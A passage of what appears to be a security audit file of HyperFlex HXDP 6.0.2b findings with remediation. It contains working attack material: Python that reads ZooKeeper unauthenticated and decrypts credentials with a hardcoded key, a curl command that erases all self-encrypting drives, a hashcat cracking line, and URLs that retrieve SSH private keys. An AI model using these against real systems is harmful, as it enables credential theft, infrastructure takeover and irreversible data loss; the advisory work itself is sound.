                "System File Integrity monitoring is explicitly bypassed after cert/key write — "
                "replacement is not flagged by integrity monitoring."
            ),
            "zk_access_model": (
                "Default ZK ACL: world:anyone:cdrwa. "
                "ZK port 2181 unauthenticated (confirmed in application.conf: defaultConnectionString='localhost:2181'). "
                "ZK port 2181 accessible from management network with default OPEN_ACL_UNSAFE ACL."
            ),
            "exploit_scenario": (
                "Attacker with ZK write access (port 2181, no auth required by default): "
                "1. Construct HxCertificate JSON with attacker-controlled cert+key strings; "
                "2. zkCli.sh -server <clusterIP>:2181 set /certificates/hxcertificate '<json>'; "
                "3. NodeCache watcher fires; nginx cert/key replaced; nginx restarted; SFI suppressed; "
                "4. All HTTPS traffic to HyperFlex management (port 443) is now MITM-able. "
                "5. Attacker-controlled cert in place — login credentials harvested from HX Connect."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Set ZK ACL on /certificates/ subtree to restrict writes to authenticated sessions only. "
            "Do not accept raw cert/key material from ZK without signature verification by a trusted CA. "
            "Replace direct PrintWriter write with a CA-signed certificate rotation workflow. "
            "Do not suppress SFI — cert changes must trigger an integrity baseline update, not skip it."
        ),
    },
}

HX_F005 = {
    "id": "HX-F005",
    "title": (
        "HyperFlex HXDP 6.x: ZooKeeper /user_credentials Path Stores SHA-256 crypt(3) "
        "Hashes for root, admin, and diag Accounts; Readable Without Authentication via "
        "Default OPEN_ACL_UNSAFE — Offline Hash Cracking Yields OS Root and Admin Credentials"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cwe": "CWE-916",
    "component": (
        "HyperFlex HXDP 6.0.2b (hxSecuritySvcMgr-1.0, PasswordOperations, "
        "mkpasswd.sh, setpasswd.sh); ZooKeeper ensemble (world:anyone:cdrwa, OPEN_ACL_UNSAFE default)"
    ),
    "versions_affected": "HXDP 5.x, 6.x (confirmed in 6.0.2b application.conf from hxSecuritySvcMgr-1.0.jar); earlier versions expected",
    "description": (
        "The hxSecuritySvcMgr daemon synchronizes operating system credentials for the "
        "root, admin, and diag accounts to ZooKeeper at path /user_credentials. The "
        "credential entry format is 'username:hash;' where the hash is a SHA-256 crypt(3) "
        "value (\\$5\\$...) generated by mkpasswd -m sha-256. Synchronization is enabled by "
        "default (syncEnabled = true) and covers all three accounts.\n\n"
        "The ZK namespace carries a world:anyone:cdrwa ACL (ZK default OPEN_ACL_UNSAFE). Any host with network "
        "access to ZooKeeper port 2181 can read /user_credentials without credentials, "
        "obtaining the SHA-256 crypt hashes for all three synchronized accounts. SHA-256 "
        "crypt (hashcat mode 7400) can be cracked on GPU hardware. The root hash grants "
        "OS root access via SSH or console (PermitRootLogin yes is the HXDP default). "
        "The admin hash grants full HX Connect cluster management API access.\n\n"
        "The credential sync feature is architecturally necessary: when admin changes the "
        "admin password via HX Connect, hxSecuritySvcMgr writes the new hash to ZK so all "
        "storage controller VMs in the cluster can apply it locally. The ZK read path "
        "exposes the current in-use credentials, not stale build-time values."
    ),
    "evidence": {
        "zk_path": "/user_credentials",
        "sync_config": (
            "# hxSecuritySvcMgr-1.0.jar embedded application.conf:\n"
            "password {\n"
            "  zkPath = '/user_credentials'\n"
            "  syncEnabled = true\n"
            "  syncAccounts = ['root', 'admin', 'diag']\n"
            "}"
        ),
        "credential_format": (
            "# Inferred from PasswordOperations.syncPwToZK + split(':', ';') parsing:\n"
            "# ZK value at /user_credentials:\n"
            "#   root:$5$<salt>$<sha256crypt>;admin:$5$<salt>$<sha256crypt>;diag:$5$<salt>$<sha256crypt>;\n"
            "# Generated by mkpasswd.sh (mkpasswd -m sha-256)"
        ),
        "hash_scripts": (
            "# mkpasswd.sh:\n"
            "echo ${1} | mkpasswd -m sha-256 -s\n\n"
            "# setpasswd.sh (chpasswd -e = pre-encrypted input):\n"
            "echo -e ${user}:${pass} | chpasswd -e"
        ),
        "acl_chain": (
            "ZK default ACL world:anyone:cdrwa (OPEN_ACL_UNSAFE) applies to all paths on startup.\n"
            "=> /user_credentials inherits world:anyone:cdrwa\n"
            "=> zkCli.sh -server <hx-ctlvm>:2181 get /user_credentials returns all three hashes"
        ),
        "crack_path": (
            "hashcat -m 7400 /user_credentials.txt /usr/share/wordlists/rockyou.txt\n"
            "# mode 7400 = sha256crypt (\\$5\\$)\n"
            "# Root hash cracked -> SSH as root to all cluster nodes\n"
            "# Admin hash cracked -> curl -k -d '{user,pass}' https://<hx>/rest/auth/token"
        ),
    },
}


HX_F006 = {
    "id": "HX-F006",
    "title": (
        "HyperFlex HXDP 5.x/6.x: ZooKeeper /storvisor2/stCluster Stores AES/ECB-Encrypted "
        "ESXi, vCenter, and UCSM Credentials; Hardcoded Key 'springpath' Confirmed in "
        "EsxAuthZKMgmtImpl — Plaintext Full-Stack Infrastructure Credentials via ZK Read"
    ),
    "severity": "CRITICAL",
    "cvss": "9.8",
    "cwe": "CWE-321",
    "component": (
        "HyperFlex HXDP 6.0.2b (stMgr-1.0.jar, common-1.0.jar, hxSecuritySvcMgr-1.0.jar, "
        "storfs-restapi/storfs-mgmt packages); "
        "ZooKeeper ensemble (clientPort 2181, world:anyone:cdrwa ACL — OPEN_ACL_UNSAFE default)"
    ),
    "versions_affected": (
        "HXDP 5.x, 6.x (confirmed in 6.0.2b: EsxAuthZKMgmtImpl constant pool #496/#497 'springpath', "
        "BasicEncryptionUtil AES/ECB/PKCS5Padding, ZKConstants$ BASE_PATH '/storvisor2' — "
        "all verified from storfs-mgmt_6.0.2b-44423_amd64.deb)"
    ),
    "description": (
        "ZooKeeper node /storvisor2/stCluster holds a JSON payload managed by "
        "ZKNodeService_StMgr (DefaultZKPayloadNodeService subclass). The payload contains "
        "AES/ECB-encrypted credentials for all components in the HyperFlex management plane: "
        "ESXi host username/password, vCenter SSO URL + encrypted username/password, and "
        "Cisco UCS Manager hostname + encrypted username/password. "
        "The encryption key is the literal string 'springpath' — confirmed present in the "
        "EsxAuthZKMgmtImpl class constant pool (Utf8 entry between "
        "'Failed to initialize root esx credentials' and 'Successfully logged in to ESX node'). "
        "BasicEncryptionUtil applies AES/ECB/PKCS5Padding with SHA-256 key derivation from "
        "the caller-supplied string. Since the ZK ACL is world:anyone:cdrwa (ZK OPEN_ACL_UNSAFE default), "
        "any unauthenticated ZK client on port 2181 can read the payload and decrypt all "
        "credentials offline with a 10-line Python script. "
        "Scope: ESXi admin → direct hypervisor console on all cluster nodes. "
        "vCenter admin → VM inventory, snapshots, network, storage policy on the entire datacenter. "
        "UCSM admin → physical blade management, BMC/KVM console, fabric interconnect config."
    ),
    "evidence": {
        "zk_path": "/storvisor2/stCluster",
        "zk_path_derivation": (
            "ZKConstants$.BASE_PATH = '/storvisor2' (Utf8 in ZKConstants$.class, common-1.0.jar). "
            "ZKConstants$.SERVICE_NAME_MGR = 'stCluster'. "
            "DefaultZKPayloadNodeService builds path as BASE_PATH + '/' + SERVICE_NAME. "
            "Result: /storvisor2/stCluster."
        ),
        "credential_fields": {
            "esx_username": "AES/ECB encrypted ESXi host username (all cluster nodes share one account)",
            "esx_password": "AES/ECB encrypted ESXi host password",
            "url_vcenter_sso": "vCenter SSO endpoint URL (plaintext)",
            "url_vcenter_encrypted_user": "AES/ECB encrypted vCenter username",
            "url_vcenter_encrypted_password": "AES/ECB encrypted vCenter password",
            "ucsm_hostname": "Cisco UCS Manager hostname (plaintext)",
            "ucsm_user": "AES/ECB encrypted UCSM username",
            "ucsm_pwd": "AES/ECB encrypted UCSM password",
            "user_credentials": "OS account SHA-256 crypt hashes (see HX-F005)",
        },
        "field_name_source": (
            "ZKEntryConstants.class from common-1.0.jar Utf8 constant pool: "
            "  esx_username, esx_password "
            "  url_vcenter_sso, url_vcenter_encrypted_user, url_vcenter_encrypted_password "
            "  ucsm_hostname, ucsm_user, ucsm_pwd "
            "  user_credentials "
            "Field constant names: STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_PASSWORD, STR_PAYLOAD_ENTRY_URL_VCENTER_SSO, "
            "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_PASSWORD, "
            "STR_PAYLOAD_ENTRY_UCSM_HOST, STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_PASSWORD."
        ),
        "aes_key_confirmation": (
            "EsxAuthZKMgmtImpl.class (stMgr-1.0.jar, 6.0.2b storfs-mgmt) javap constant pool:\n"
            "  #496 = Utf8  springpath\n"
            "  #497 = String  #496  // springpath\n"
            "Usage: ldc_w #497 at bytecode offset 0 of ESXi credential decryption method.\n"
            "Invocations confirmed: invokevirtual EncryptionUtil$.decryptData at offsets 83, 98.\n"
            "Methods that load 'springpath': getEsxCredentialsFromZK, "
            "updateAndSaveRandomEsxPasswordToZK, initializeVirtPlatformNodeLoginFromRoot. "
            "Same 'springpath' literal appears as keyStorePass in hxSecuritySvcMgr "
            "syslog TLS config (application.conf syslog.keyStorePass) — shared hardcoded "
            "string across two independent subsystems confirms it is a project-level constant."
        ),
        "encryption_primitive": (
            "BasicEncryptionUtil.class (hxSecuritySvcMgr-1.0.jar): "
            "  cipher = Cipher.getInstance('AES/ECB/PKCS5Padding'); "
            "  key = MessageDigest.getInstance('SHA-256').digest(keyStr.getBytes()); "
            "  secretKeySpec = new SecretKeySpec(key, 'AES'); "
            "  cipher.init(DECRYPT_MODE, secretKeySpec); "
            "  return cipher.doFinal(Base64.decode(encryptedData))."
        ),
        "decrypt_primitive": (
            "import hashlib, base64\n"
            "from Crypto.Cipher import AES\n"
            "\n"
            "def hxdp_decrypt(b64_ciphertext: str, key_str: str = 'springpath') -> str:\n"
            "    key = hashlib.sha256(key_str.encode()).digest()\n"
            "    ct = base64.b64decode(b64_ciphertext)\n"
            "    cipher = AES.new(key, AES.MODE_ECB)\n"
            "    raw = cipher.decrypt(ct)\n"
            "    pad = raw[-1]\n"
            "    return raw[:-pad].decode()\n"
            "\n"
            "# Usage: hxdp_decrypt(zk_payload['esx_password'])\n"
            "# pycryptodome: pip install pycryptodome"
        ),
        "zk_read_primitive": (
            "# Read /storvisor2/stCluster from ZK without authentication:\n"
            "from kazoo.client import KazooClient\n"
            "import json\n"
            "zk = KazooClient(hosts='<stCtlVM_IP>:2181')\n"
            "zk.start()\n"
            "data, _ = zk.get('/storvisor2/stCluster')\n"
            "payload = json.loads(data)\n"
            "esx_pass = hxdp_decrypt(payload['esx_password'])\n"
            "vc_user = hxdp_decrypt(payload['url_vcenter_encrypted_user'])\n"
            "vc_pass = hxdp_decrypt(payload['url_vcenter_encrypted_password'])\n"
            "ucsm_pass = hxdp_decrypt(payload['ucsm_pwd'])\n"
            "zk.stop()"
        ),
        "acl_chain": (
            "ZK default ACL world:anyone:cdrwa on all paths — readable without credentials. "
            "Port 2181 TCP must be reachable from attacker position (management VLAN or "
            "from any stCtlVM after initial foothold on one node). "
            "No ZK authentication required; no TLS on ZK channel in default config."
        ),
        "firmware_evidence": (
            "6.0.2b confirmation: "
            "  (1) Exact ZK path: /storvisor2/stCluster "
            "      (ZKConstants$.BASE_PATH='/storvisor2', SERVICE_NAME_MGR='stCluster' in common-1.0.jar) "
            "  (2) Exact field names from ZKEntryConstants.class "
            "  (3) AES key 'springpath' confirmed in EsxAuthZKMgmtImpl.class constant pool #496/#497 "
            "  (4) Cipher: AES/ECB/PKCS5Padding confirmed in BasicEncryptionUtil.class javap offset 33 "
            "Severity: CRITICAL (CWE-321 — hardcoded key, not CWE-312 encrypted-storage)."
        ),
    },
    "impact": (
        "ZK port 2181 reachable on management VLAN -> read /storvisor2/stCluster -> "
        "decrypt esx_password with hxdp_decrypt('springpath') -> "
        "ESXi root-equivalent access on all cluster hypervisors. "
        "vCenter admin: full datacenter virtualization plane. "
        "UCSM admin: physical server BMC, fabric interconnect, blade firmware — "
        "persistence below OS layer. "
        "Three independent admin credential classes extracted from one ZK read."
    ),
    "remediation": (
        "Immediate: rotate ESXi, vCenter, and UCSM credentials. "
        "Short-term: block ZK port 2181 from non-stCtlVM sources at the management VLAN firewall. "
        "Long-term: "
        "  (1) Apply per-node ZK ACLs: digest:hxservice:rwcda on /storvisor2/* (replaces default OPEN_ACL_UNSAFE). "
        "  (2) Replace hardcoded 'springpath' AES key with per-deployment generated keys. "
        "  (3) Move credential storage from ZK to a dedicated secrets store with "
        "      per-service access policies. "
        "  (4) Enable ZK TLS and mutual authentication (ZK 3.5+ supports TLS)."
    ),
}


HX_F007 = {
    "id": "HX-F007",
    "title": (
        "HyperFlex HXDP 6.0.2b storfs-misc — Static AES-CBC Key Derived from Shipped Firmware File "
        "Allows Offline Decryption of All Runtime Cluster Credentials (CWE-321)"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-321",
    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-misc with Secret.class",
    "component": "storfs-misc package (springpath_env_parse.py + Secret.class + springpath_default.tunes)",
    "description": (
        "HXDP uses AES-CBC encryption to store cluster credentials in runtime *.tunes config files. "
        "The AES key is derived as MD5(Secret.class) in hex-string form, where Secret.class ships "
        "inside the storfs-misc firmware package at a known static path. Secret.class is a Java "
        "class file containing a static long field (secreteKey = 4346757647632874372L) compiled "
        "from Test.java and deployed under the misleading name Secret.class — an attempt at "
        "obscurity that provides no actual key protection.\n\n"
        "The encryption key for all HXDP 6.0.2b installations is deterministic:\n"
        "  Secret.class path: /usr/share/hyperflex/storfs-misc/Secret.class\n"
        "  MD5 of Secret.class (6.0.2b): 1f6d13bcd7753f2d3b2e2da361b7afb5\n"
        "  AES key = '1f6d13bcd7753f2d3b2e2da361b7afb5' (hex string, 32 chars = 32-byte AES key)\n\n"
        "Runtime encrypted credentials are stored in deployment-time-generated files:\n"
        "  /opt/hyperflex/tunes/springpath_custom_node.tunes    — per-node credentials\n"
        "  /opt/hyperflex/tunes/springpath_custom_cluster.tunes — per-cluster credentials\n"
        "The encrypted keys are: stctl_vm_passwd, ssl_cert_passwd, installer_passwd.\n"
        "stctl_vm_passwd is the root password for the Storage Controller VM (ctlVM).\n"
        "ssl_cert_passwd protects the SSL keystore. installer_passwd is used at deployment.\n\n"
        "Key derivation and decrypt code confirmed in springpath_env_parse.py "
        "(storfs-misc 6.0.2b, /usr/share/hyperflex/storfs-misc/springpath_env_parse.py):\n"
        "  def md5(fname):\n"
        "      hash_md5 = hashlib.md5()\n"
        "      with open(fname, 'rb') as f:\n"
        "          for chunk in iter(lambda: f.read(4096), b''):\n"
        "              hash_md5.update(chunk)\n"
        "      return hash_md5.hexdigest()\n\n"
        "  def decrypt(key, enc):\n"
        "      enc = base64.b64decode(enc)\n"
        "      iv = enc[:16]\n"
        "      cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)\n"
        "      return unpad(cipher.decrypt(enc[16:]))\n\n"
        "  file_md5 = md5('/usr/share/hyperflex/storfs-misc/Secret.class')\n"
        "  decoded = decrypt(file_md5, value)  # file_md5 is the 32-char hex AES key\n\n"
        "Attack path: public firmware download → extract Secret.class → compute MD5 → "
        "static AES-CBC key known for all 6.0.2b deployments. An attacker with access to the "
        "runtime custom_node.tunes file (via ZK read, config export, or file system access) "
        "can decrypt all stored cluster credentials. The key never changes between installations "
        "because it derives from a static firmware file, not a per-deployment secret."
    ),
    "proof_of_concept": (
        "# Key derivation PoC — key is static across all 6.0.2b installs\n"
        "import hashlib, base64\n"
        "from Crypto.Cipher import AES\n\n"
        "def md5_file(path):\n"
        "    h = hashlib.md5()\n"
        "    with open(path, 'rb') as f:\n"
        "        for chunk in iter(lambda: f.read(4096), b''):\n"
        "            h.update(chunk)\n"
        "    return h.hexdigest()\n\n"
        "def unpad(s): return s[:-ord(s[len(s)-1:])]\n\n"
        "def decrypt(key, enc):\n"
        "    enc = base64.b64decode(enc)\n"
        "    iv = enc[:16]\n"
        "    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)\n"
        "    return unpad(cipher.decrypt(enc[16:]))\n\n"
        "# Static key confirmed from 6.0.2b firmware:\n"
        "key = md5_file('/usr/share/hyperflex/storfs-misc/Secret.class')\n"
        "# key == '1f6d13bcd7753f2d3b2e2da361b7afb5' for all 6.0.2b nodes\n\n"
        "# Decrypt any value from custom_node.tunes or custom_cluster.tunes:\n"
        "# decoded = decrypt(key, b64_ciphertext_from_tunes)"
    ),
    "files": [
        "/usr/share/hyperflex/storfs-misc/Secret.class",
        "/usr/share/hyperflex/storfs-misc/springpath_default.tunes",
        "/opt/hyperflex/storfs-factory/utils/springpath_env_parse.py",
    ],
    "remediation": (
        "1. Replace MD5(Secret.class) key derivation with a properly seeded per-installation "
        "   secret (e.g., PBKDF2 with per-node salt generated at first boot, stored in "
        "   a hardware-backed keystore or TPM).\n"
        "2. Remove Secret.class from the firmware distribution package; key material must "
        "   never ship alongside ciphertext.\n"
        "3. Rotate all credentials currently stored in *.tunes files; the 6.0.2b default "
        "   key is now known.\n"
        "4. Enforce mandatory credential rotation during initial cluster deployment; reject "
        "   'Cisco123' as stctl_vm_passwd at the UI layer.\n"
        "5. Restrict ctlVM SSH (port 22) to the storage management network; prevent access "
        "   from the ESXi management VLAN."
    ),
}

HX_F008 = {
    "id": "HX-F008",
    "title": (
        "HyperFlex HXDP 6.0.2b storfs-appliance sedsvc — Unauthenticated HTTP API on Port 8012 "
        "Exposes SED Drive Cryptographic Erasure and Node KEK to Any Network Client"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
    "cwe": "CWE-306",
    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-appliance with sedsvc",
    "component": "storfs-appliance package (sedsvc Go binary)",
    "description": (
        "sedsvc is a Go HTTP server that manages TCG OPAL Self-Encrypting Drive (SED) "
        "operations on HXDP storage controller VMs. It listens on all network interfaces "
        "(0.0.0.0:8012) and implements zero authentication on all endpoints.\n\n"
        "Default listen address confirmed via main.main disassembly:\n"
        "  movq $0x1f4c, main.port   ; 0x1f4c = 8012 decimal\n"
        "  server.Addr = ':8012'     ; binds to all interfaces\n\n"
        "The HTTP dispatch function main.(*myHandler).ServeHTTP performs a single map "
        "lookup (URL string → handler function pointer) and calls the handler directly "
        "with zero interposed authentication or authorization check.\n\n"
        "Confirmed exposed endpoints (via Go symbol table + HXDP_* function prefix convention):\n"
        "  POST /sec_erase_all  → BMC_SecureEraseAll → SEDUTIL_SecureEraseAll\n"
        "                          Cryptographically erases ALL SED drives on the node.\n"
        "                          Data is irrecoverable. Confirmed call chain:\n"
        "                          json.Decode(body) → BMC_SecureEraseAll @ 0x674940\n"
        "  POST /sec_erase      → BMC_SecureErase → SEDUTIL_SecureErase\n"
        "                          Erases a specific drive by serial number.\n"
        "  GET  /get_config     → BMC_GetConfigFileAndDispatch\n"
        "                          Returns config.json from BMC, which contains the node KEK\n"
        "                          (Key Encryption Key) as a base64-encoded string.\n"
        "                          The node KEK is used to unlock drive encryption keys.\n"
        "  GET  /get_inventory  → SEDUTIL_GetInventory\n"
        "                          Returns per-drive encryption state, serial numbers,\n"
        "                          firmware versions, and lock status.\n"
        "  GET  /disk_status    → HXDP_DiskStatus\n"
        "  GET  /hello          → HXDP_Hello (service liveness probe)\n"
        "  POST /start_polling  → BMC_PollConfigFile\n"
        "  POST /stop_polling   → stops BMC config polling\n\n"
        "The ctlVM management NIC (eth0) is accessible to ESXi hosts, vCenter, and any "
        "administrator workstation on the HX management VLAN. The sedsvc service binds to "
        "all interfaces including the storage data NIC, extending the exposure surface.\n\n"
        "The service is activated only on SED-capable clusters "
        "(/etc/hyperflex/sed_capability.conf: sed_capable_cluster=True) but is otherwise "
        "unrestricted.\n\n"
        "Impact chain:\n"
        "  1. Attacker on HX management VLAN sends unauthenticated POST to any ctlVM:8012/sec_erase_all\n"
        "  2. sedsvc calls SEDUTIL_SecureEraseAll without credential check\n"
        "  3. All SED drives on the node are cryptographically erased — data is unrecoverable\n"
        "  Alternatively:\n"
        "  1. GET :8012/get_config → extract base64 node KEK from response JSON\n"
        "  2. KEK used to derive drive encryption keys across all drives on the node"
    ),
    "proof_of_concept": (
        "# Unauthenticated secure erase all drives\n"
        "# No auth token, no session cookie, no TLS client cert required\n"
        "curl -s -X POST http://<ctlvm_ip>:8012/sec_erase_all \\\n"
        "  -H 'Content-Type: application/json' \\\n"
        "  -d '{}'\n"
        "# Result: all SED drives on the node are cryptographically erased\n\n"
        "# Retrieve node KEK\n"
        "curl -s http://<ctlvm_ip>:8012/get_config\n"
        "# Response JSON contains: {\"nodeKek\": \"<base64_kek>\", ...}\n\n"
        "# sedsvc ServeHTTP dispatch (no auth):\n"
        "# 0x666b60:  call mapaccess2_faststr(mux, url_path)\n"
        "# 0x666b65:  test bl,bl     ; found?\n"
        "# 0x666b67:  je not_found   ; only check is: does route exist?\n"
        "# 0x666b80:  call *rsi      ; call handler directly, NO auth gate"
    ),
    "files": [
        "/usr/share/hyperflex/storfs-appliance/sedsvc",
        "/etc/hyperflex/sed_capability.conf",
    ],
    "remediation": (
        "1. Add authentication to all sedsvc endpoints. Minimum: shared secret or "
        "   bearer token validated before any HXDP_* handler is called. Bind to "
        "   127.0.0.1 only if remote access is not required; use a local Unix socket "
        "   for intra-node IPC instead of TCP if the caller is always local.\n"
        "2. Restrict TCP port 8012 to loopback (127.0.0.1) via iptables/nftables; "
        "   proximate callers (storfs-core) can use localhost.\n"
        "3. If remote invocation is required, enforce mTLS with a node certificate "
        "   before dispatching any drive operation.\n"
        "4. Gate /sec_erase and /sec_erase_all behind an additional confirmation "
        "   token with short TTL (e.g., TOTP or signed nonce) to prevent single-packet "
        "   drive erasure."
    ),
}

HX_F009 = {
    "id": "HX-F009",
    "title": "Privileged Proxy Port 8997 Binds to All Interfaces; nginx Auto-Injects Admin Session ID",
    "severity": "CRITICAL",
    "cvss": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-284",
    "component": "storfs-misc/rest_internal.conf, storfs-misc/restintport.cfg, storfs-misc/genrestconf.sh",
    "description": (
        "rest_internal.conf configures nginx to listen on port 8997 (from restintport.cfg) "
        "with `listen *:PORT ssl` — binding to ALL network interfaces, not just loopback. "
        "For every request received on port 8997, nginx automatically injects "
        "`proxy_set_header X-RootSessionID <session_id>` before proxying to the backend "
        "at localhost:8000 (management API). nginx proxy_set_header overwrites any "
        "client-supplied X-RootSessionID with the real admin session ID. "
        "Consequently, ANY client that can establish a TCP connection to port 8997 "
        "on any ctlVM interface receives admin-level authenticated access to the full "
        "HyperFlex REST API (/rest, /aaa, /coreapi, /dataprotection, /backupservice, "
        "/encryption, /volume, /securityservice, /supportservice, /slservice, /upgrade, "
        "/upload, /stMgr) without supplying credentials. "
        "Port 8997 is used by the stCli tool from remote hosts (stCli.sh: "
        "springpath_host=clusterIp; springpath_port=8997) confirming the port is "
        "network-accessible. The design intent comment ('Data network on custom port') "
        "assumes network isolation, but the binding is *:8997 — no interface restriction. "
        "An attacker on any network segment that can reach the ctlVM on port 8997 "
        "has unauthenticated admin access to the entire cluster management API."
    ),
    "evidence": [
        "rest_internal.conf:4: listen *:PORT ssl;  # PORT=8997 from restintport.cfg",
        "restintport.cfg: PORT=8997",
        "rest_internal.conf:42: proxy_set_header X-RootSessionID SESSIONID;  # injected for ALL requests",
        "rest_internal.conf:72: proxy_set_header X-RootSessionID SESSIONID;  # stMgr path also",
        "genrestconf.sh: comment: 'binding is available only for Data network on custom port'",
        "stCli.sh:12: export springpath_host=${clusterIp}; export springpath_port=8997",
        "Attack: curl -k https://<ctlvm>:8997/coreapi/v1/clusters -> 200 admin response",
        "rest_internal.conf covers: /rest /aaa /coreapi /dataprotection /backupservice /encryption /volume /securityservice /supportservice /slservice /upgrade /upload /stMgr",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Change `listen *:PORT ssl` to `listen 127.0.0.1:PORT ssl` to restrict port 8997 "
        "to loopback only. The stCli tool should connect via the standard port 443 with "
        "explicit credentials rather than the privileged proxy port. "
        "If the data network must be used, bind explicitly to the data interface IP "
        "rather than wildcard, and add a firewall rule restricting access to the ctlVM itself."
    ),
    "tags": ["auth-bypass", "privileged-port", "nginx", "session-injection", "network", "cwe-284", "critical"],
}

HX_F010 = {
    "id": "HX-F010",
    "title": "Unauthenticated Access to /tmp/ Directory via Unauthenticated /sbdl/ nginx Path",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-284",
    "component": "storfs-misc/nginx.conf",
    "description": (
        "nginx.conf maps the /sbdl/ path to the system /tmp/ directory with no "
        "authentication: `location /sbdl/ { alias /tmp/; auth_basic off; }`. "
        "Any file in /tmp/ is downloadable by an unauthenticated remote attacker via "
        "`GET http://<ctlvm>/sbdl/<filename>`. This path was intended for support bundle "
        "downloads but the directory alias exposes the entire /tmp/ tree. "
        "Critical files known to be written to /tmp/ during normal operations: "
        "(1) `/tmp/sshKeyPair*.json` — SSH private keys for all storage controller VMs "
        "(generated by generateSshKeys.py, referenced in commonFunctions.py and "
        "0007_create_authorized_keys_for_admin_ESX.py — HX-F164/HX-F169); "
        "(2) `/tmp/upgradeHooksCreds*.json` — plaintext ESX username and password "
        "(referenced in all upgrade hook scripts — HX-F169); "
        "(3) `/tmp/nodeInventory*.json` — cluster node topology; "
        "(4) `/tmp/clusterConfig*.json` — cluster configuration data. "
        "An attacker who sends GET requests to /sbdl/ during a cluster upgrade or "
        "node replacement operation recovers SSH private keys for all nodes and ESX "
        "credentials without authentication."
    ),
    "evidence": [
        "nginx.conf:63-66: location /sbdl/ { alias /tmp/; auth_basic off; }",
        "commonFunctions.py:645: credsFile = getMatchingFileName('/tmp/sshKeyPair*.json')",
        "generateSshKeys.py:46: sshKeysFileHandle, sshKeysFile = mkstemp(suffix='.json', prefix='sshKeyPair', dir='/tmp')",
        "0007_create_authorized_keys_for_admin_ESX.py:20: JSON_CREDS_FILE_MATCH = '/tmp/upgradeHooksCreds*.json'",
        "Attack: GET http://<ctlvm>/sbdl/sshKeyPair<random>.json -> SSH private key for all nodes",
        "Attack: GET http://<ctlvm>/sbdl/upgradeHooksCreds<random>.json -> ESX plaintext credentials",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Restrict /sbdl/ to specific filenames matching the support bundle pattern "
        "(e.g. `location ~ ^/sbdl/supportBundle-[a-zA-Z0-9_-]+\\.tar\\.gz$`) rather "
        "than aliasing the entire /tmp/ directory. "
        "Move SSH key files, credential files, and node inventory files out of /tmp/ "
        "to a directory that is not nginx-served. "
        "If /tmp/ aliasing is necessary for legacy reasons, add auth_basic with credentials "
        "or restrict with `allow 127.0.0.1; deny all`."
    ),
    "tags": ["auth-bypass", "file-read", "tmp", "nginx", "ssh-keys", "cwe-284", "critical"],
}


HX_F011 = {
    "id": "HX-F011",
    "title": "Root Session Token Generated with 15-bit Entropy ($RANDOM) and Stored World-Readable",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-330",
    "component": "storfs-misc/set_shared_key.sh",
    "description": (
        "set_shared_key.sh generates the `X-RootSessionID` authentication token used by "
        "stSSOMgr and all `useRootSessionId=True` API callers: "
        "`sharedkey=$nodeid-$RANDOM` where `nodeid` is read from "
        "`/opt/hyperflex/etc/product_uuid`. "
        "Bash `$RANDOM` generates integers in [0, 32767] — 15 bits of entropy, "
        "32,768 possible values total. The `product_uuid` is the VMware VM UUID, "
        "readable from BIOS data (`dmidecode -s system-uuid`) by any local user. "
        "An attacker with the product UUID can enumerate the full keyspace in under "
        "one second and obtain a valid `X-RootSessionID` token. "
        "The generated file is then made world-readable: `chmod 644 root_file.pub`. "
        "Any local user can read the token directly without brute-force. "
        "The token is placed at `/etc/root_file.pub` before `migrate-secureconfig.sh` "
        "moves it to `/etc/hyperflex/secure/root_file.pub`, meaning it is world-readable "
        "in `/etc/` first and potentially in the secure directory as well. "
        "The token is used with `X-RootSessionID` header in HTTP requests to the "
        "management API at `http://localhost:8000` — bypassing normal JWT authentication "
        "for certificate management, inventory, STIG settings, and cluster lifecycle "
        "operations. Affected callers: `nginxCertManager.py`, `synchronizeSyslog.py`, "
        "`schScripts.py`, `SLEvaluationJob.py`, `update-inventory.py`, `hsu_utils.py`, "
        "upgrade hook `5997_stig_setting_ESX.py`."
    ),
    "evidence": [
        "set_shared_key.sh line 11: sharedkey=$nodeid-$RANDOM (15-bit entropy)",
        "set_shared_key.sh line 13: chmod 644 $dest_folder/root_file.pub (world-readable)",
        "nodeid = product_uuid read from /opt/hyperflex/etc/product_uuid (VM UUID, derivable from dmidecode)",
        "StTransportBase.py line 26: X-RootSessionID loaded from /etc/hyperflex/secure/root_file.pub",
        "commonFunctions.py line 42: headers['X-RootSessionID'] = rootSessionId",
        "Token bypasses JWT auth for certificate, STIG, inventory, and cluster lifecycle APIs",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace `$RANDOM` with a cryptographically secure random generator: "
        "`sharedkey=$(openssl rand -hex 32)`. "
        "Change the file permissions to 600 (root-only): `chmod 600 root_file.pub`. "
        "Ensure the migration script preserves restrictive permissions when moving the file "
        "to `/etc/hyperflex/secure/`. "
        "Consider replacing the file-based `X-RootSessionID` scheme with a time-limited "
